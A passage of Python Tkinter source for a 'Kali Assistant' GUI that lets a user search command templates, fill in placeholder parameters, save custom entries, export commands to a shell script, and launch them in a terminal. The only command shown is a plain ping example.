        ).pack(fill=tk.X, pady=(0, 18))

        self.new_cat_var  = tk.StringVar()
        self.new_name_var = tk.StringVar()
        self.new_desc_var = tk.StringVar()
        self.new_temp_var = tk.StringVar()
        self.new_keys_var = tk.StringVar()

        def form_field(num, label, var, mono=False, is_combo=False):
            blk = tk.Frame(container, bg=self.bg_base)
            blk.pack(fill=tk.X, pady=6)
            tk.Label(
                blk, text=f"{num}. {label}",
                bg=self.bg_base, fg=self.fg_muted,
                font=self.font_title,
                anchor=tk.W,
            ).pack(fill=tk.X, pady=(0, 3))
            if is_combo:
                wrap = tk.Frame(blk, bg=self.border_dim, padx=1, pady=1)
                wrap.pack(fill=tk.X)
                self.new_cat_box = ttk.Combobox(
                    wrap, textvariable=var, font=self.font_mono)
                self.new_cat_box.pack(fill=tk.X, ipady=3)
            else:
                wrap, _ = self._framed_entry(blk, var, mono=mono, ipady=5)
                wrap.pack(fill=tk.X)

        form_field("1", "Category Name",                self.new_cat_var, is_combo=True)
        form_field("2", "Application Name / Label",     self.new_name_var)
        form_field("3", "What does this do?",           self.new_desc_var)
        form_field("4", "Command Execution Code",       self.new_temp_var, mono=True)
        form_field("5", "Keywords (comma-separated)",   self.new_keys_var)

        tip_lines = (
            "  ╔══════════════════════════════════════════════════════════╗\n"
            "  ║  DYNAMIC VARS: wrap placeholders in {curly_braces}      ║\n"
            "  ║  Example: ping -c {count} {host}                        ║\n"
            "  ║  → Auto-generates input fields in the Explorer tab.      ║\n"
            "  ╚══════════════════════════════════════════════════════════╝"
        )
        tk.Label(
            container, text=tip_lines,
            bg=self.bg_card, fg=self.fg_muted,
            font=self.font_status, justify=tk.LEFT,
            pady=10, padx=8,
            anchor=tk.W,
        ).pack(fill=tk.X, pady=14)

        act = tk.Frame(container, bg=self.bg_base)
        act.pack(fill=tk.X)

        self._btn(
            act, text="💾  ADD TO DATABASE",
            command=self._add_custom_command,
            bg=self.neon_green, fg=self.bg_base,
            font=self.font_title,
            padx=14, pady=6,
        ).pack(side=tk.LEFT)

        self._btn(
            act, text="CLEAR FIELDS",
            command=self._clear_add_form,
            bg=self.bg_panel, fg=self.fg_muted,
            padx=10, pady=6,
        ).pack(side=tk.LEFT, padx=12)

    # ══════════════════════════════════════════════════════════════════════
    # Explorer controller
    # ══════════════════════════════════════════════════════════════════════
    def _populate_categories(self):
        def _num(s):
            m = re.match(r"^(\d+)", s)
            return (int(m.group(1)), s) if m else (999, s)

        cats = sorted(set(c["category"] for c in self.commands_db), key=_num)
        self.cat_dropdown["values"] = ["All Categories"] + cats
        self.new_cat_box["values"]  = cats

    def _filter_commands(self):
        query   = self.search_var.get().lower().strip()
        sel_cat = self.cat_var.get()

        matched = []
        for cmd in self.commands_db:
            if sel_cat != "All Categories" and cmd["category"] != sel_cat:
                continue
            if not query:
                matched.append(cmd)
            else:
                score = 0
                if query in cmd["name"].lower():        score += 10
                if query in cmd["description"].lower(): score += 5
                if query in cmd["category"].lower():    score += 3
                for kw in cmd["keywords"]:
                    if query in kw.lower():             score += 2
                if score:
                    matched.append((score, cmd))

        if query:
            matched.sort(key=lambda x: x[0], reverse=True)
            self.current_commands = [x[1] for x in matched]
        else:
            self.current_commands = matched

        self._update_listbox(query)

    def _update_listbox(self, highlight_query=""):
        prev_name = self.selected_command["name"] if self.selected_command else None
        self.listbox.delete(0, tk.END)
        restore_idx = None

        for i, cmd in enumerate(self.current_commands):
            self.listbox.insert(tk.END, cmd['name'])
            if cmd["name"] in self.favorites:
                self.listbox.itemconfig(i, foreground=self.amber)
            elif i % 2 == 0:
                self.listbox.itemconfig(i, foreground=self.fg_bright)
            else:
                self.listbox.itemconfig(i, foreground="#8bbf97")

            if cmd["name"] == prev_name:
                restore_idx = i

        if restore_idx is not None:
            self.listbox.selection_set(restore_idx)
            self.listbox.see(restore_idx)
        else:
            if prev_name:
                self.selected_command = None
                self.cmd_name_label.config(
                    text="Select a command from the list →")
                self.cmd_desc_text.config(state=tk.NORMAL)
                self.cmd_desc_text.delete("1.0", tk.END)
                self.cmd_desc_text.config(state=tk.DISABLED)
                self._clear_params()
                self.output_entry.delete(0, tk.END)
                self._update_fav_btn()

    def _on_command_select(self, event):
        sel = self.listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self.current_commands):
            return

        self.param_entries = {}

        self.selected_command = self.current_commands[idx]
        self.cmd_name_label.config(text=self.selected_command["name"])

        self.cmd_desc_text.config(state=tk.NORMAL)
        self.cmd_desc_text.delete("1.0", tk.END)
        self.cmd_desc_text.insert(tk.END, self.selected_command["description"])
        self.cmd_desc_text.config(state=tk.DISABLED)

        self._update_fav_btn()

        if "templates" in self.selected_command:
            variants = list(self.selected_command["templates"].keys())
            self.variant_combo["values"] = variants
            self.variant_combo.set(variants[0])
            self.variant_frame.pack(fill=tk.X, pady=(8, 4))
        else:
            self.variant_frame.pack_forget()

        self._rebuild_parameters()

    def _get_current_template(self):
        if not self.selected_command:
            return ""
        if "templates" in self.selected_command:
            v    = self.variant_var.get()
            tmpl = self.selected_command["templates"]
            if v in tmpl:
                return tmpl[v]
            first = list(tmpl.keys())[0]
            self.variant_combo.set(first)
            return tmpl[first]
        return self.selected_command.get("template", "")

    def _rebuild_parameters(self):
        self._clear_params()
        self.param_entries = {}

        template     = self._get_current_template()
        placeholders = sorted(set(re.findall(r"\{(.*?)\}", template)))

        if placeholders:
            self._sep.pack(fill=tk.X, padx=14, pady=(8, 6))
            self.param_canvas.pack(fill=tk.BOTH, expand=True,
                                   padx=14, pady=(0, 6))

            tk.Label(
                self.params_frame, text="PARAMETERS",
                bg=self.bg_base, fg=self.neon_lime,
                font=self.font_title,
                anchor=tk.W,
            ).grid(row=0, column=0, columnspan=2,
                   sticky=tk.W, pady=(0, 6), padx=4)

            for row_i, param in enumerate(placeholders, start=1):
                label_text = param.replace("_", " ").upper()

                tk.Label(
                    self.params_frame, text=label_text,
                    bg=self.bg_base, fg=self.fg_muted,
                    font=self.font_body,
                    width=22, anchor=tk.W,
                ).grid(row=row_i, column=0,
                       sticky=tk.W, padx=(4, 10), pady=4)

                var = tk.StringVar()
                var.trace_add("write", lambda *_: self._render_output())

                wrap = tk.Frame(self.params_frame,
                                bg=self.border_active, padx=1, pady=1)
                wrap.grid(row=row_i, column=1,
                          sticky=tk.EW, pady=4, padx=(0, 4))

                tk.Entry(
                    wrap,
                    textvariable=var,
                    bg=self.bg_card, fg=self.neon_green,
                    insertbackground=self.neon_green,
                    font=self.font_mono,
                    relief=tk.FLAT, bd=0,
                ).pack(fill=tk.X, ipady=5)

                self.param_entries[param] = var

            self.params_frame.columnconfigure(1, weight=1)
        else:
            self._sep.pack_forget()
            self.param_canvas.pack_forget()

        self._render_output()

    def _clear_params(self):
        for w in self.params_frame.winfo_children():
            w.destroy()
        self.param_canvas.pack_forget()
        self._sep.pack_forget()

    def _render_output(self):
        if not self.selected_command:
            self.output_entry.delete(0, tk.END)
            return
        rendered = self._get_current_template()
        for param, var in self.param_entries.items():
            val = var.get().strip()
            rendered = rendered.replace(
                f"{{{param}}}", val if val else f"<{param}>")
        self.output_entry.delete(0, tk.END)
        self.output_entry.insert(0, rendered)

    # ══════════════════════════════════════════════════════════════════════
    # Button actions
    # ══════════════════════════════════════════════════════════════════════
    def _copy_to_clipboard(self):
        cmd = self.output_entry.get()
        if cmd:
            self.root.clipboard_clear()
            self.root.clipboard_append(cmd)
            self.root.update()
            orig_bg = self.copy_btn["bg"]
            self.copy_btn.config(
                text="✓  COPIED!", fg=self.neon_green)
            self.root.after(1600, lambda: self.copy_btn.config(
                text="📋  COPY", fg=self.fg_bright, bg=orig_bg))

    def _export_to_sh(self):
        cmd = self.output_entry.get().strip()
        if not cmd or "<" in cmd:
            messagebox.showwarning(
                "Export Error", "Fill all parameters before exporting.")
            return
        out_path = os.path.expanduser("~/kali_assistant_export.sh")
        needs_hdr = not os.path.exists(out_path)
        try:
            with open(out_path, "a") as f:
                if needs_hdr:
                    f.write(
                        "#!/usr/bin/env bash\n"
                        "# 🌿 Kali Assistant — Exported Commands\n\n")
                ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                name = (self.selected_command["name"]
                        if self.selected_command else "Unknown")
                f.write(f"# [{ts}] {name}\n{cmd}\n\n")
            messagebox.showinfo("Exported ✓",
                                f"Appended to:\n{out_path}")
        except Exception as e:
            messagebox.showerror("Export Failed", str(e))

    def _run_in_terminal(self):
        command = self.output_entry.get()
        if not command or "<" in command or ">" in command:
            messagebox.showwarning(
                "Incomplete Command",
                "Fill all parameter fields before executing.")
            return

        name = (self.selected_command["name"]
                if self.selected_command else "Custom")
        self._push_history(name, command)

        payload = (f"{command}; echo ''; "
                   "echo '[ Process finished — press ENTER to close ]'; read")
        terminals = [
            ["x-terminal-emulator", "-e", "bash", "-c", payload],
            ["qterminal",           "-e", "bash", "-c", payload],
            ["xfce4-terminal",      "-e", f"bash -c '{payload}'"],
            ["gnome-terminal",      "--", "bash", "-c", payload],
            ["xterm",               "-e", "bash", "-c", payload],
        ]
        for tc in terminals:
            try:
                subprocess.Popen(tc, start_new_session=True)
                return
            except FileNotFoundError:
                continue

        try:
            subprocess.Popen(["bash", "-c", command], start_new_session=True)
            messagebox.showinfo("Running",
                                "Command launched in background shell.")
        except Exception as e:
            messagebox.showerror("Execution Error",
                                 f"Cannot spawn a terminal:\n{e}")

    # ══════════════════════════════════════════════════════════════════════
    # Add-command tab
    # ══════════════════════════════════════════════════════════════════════
    def _add_custom_command(self):
        cat      = self.new_cat_var.get().strip()
        name     = self.new_name_var.get().strip()
        desc     = self.new_desc_var.get().strip()
        template = self.new_temp_var.get().strip()
        keywords = [k.strip().lower()
                    for k in self.new_keys_var.get().split(",") if k.strip()]

        if not cat or not name or not template:
            messagebox.showerror(
                "Incomplete", "Category, Name, and Command are required.")
            return

        new_cmd = {
            "category":    cat,
            "name":        name,
            "description": desc or f"Custom command: {name}",
            "keywords":    keywords + [name.lower(), cat.lower()],
            "template":    template,
        }
        self.custom_commands.append(new_cmd)
        self._save_customs()
        messagebox.showinfo("Success ✓", f"'{name}' added to your local database!")
        self._clear_add_form()
        self.notebook.select(0)

    def _clear_add_form(self):
        for v in (self.new_cat_var, self.new_name_var,
                  self.new_desc_var, self.new_temp_var, self.new_keys_var):
            v.set("")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    root = tk.Tk()
    app  = KaliAssistantApp(root)
    root.mainloop()
